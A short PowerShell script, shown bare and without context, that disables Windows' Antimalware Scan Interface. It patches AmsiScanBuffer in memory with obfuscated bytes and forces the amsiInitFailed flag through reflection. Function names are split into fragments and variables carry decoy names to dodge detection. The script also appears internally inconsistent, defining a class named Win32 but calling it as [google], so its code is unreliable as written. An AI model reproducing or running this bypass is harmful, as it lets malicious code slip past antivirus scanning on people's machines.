$google = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $google
$LoadLibrary = [google]::LoadLibrary("a" + "m" + "si.dll")
$bestbuy = [google]::GetProcAddress($LoadLibrary, "A" + "msi" + "Sc" + "an" + "B" + "uffer")
$p = 0
[google]::VirtualProtect($bestbuy, [uint32]5, 0x40, [ref]$p)
$confluence = [Byte[]] (0x12+0xA6, 0x25+0x32, 0x00, 0x02+0x05, 0x80, 0xE+0xB5)
[System.Runtime.InteropServices.Marshal]::Copy($confluence, 0, $bestbuy, 6)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
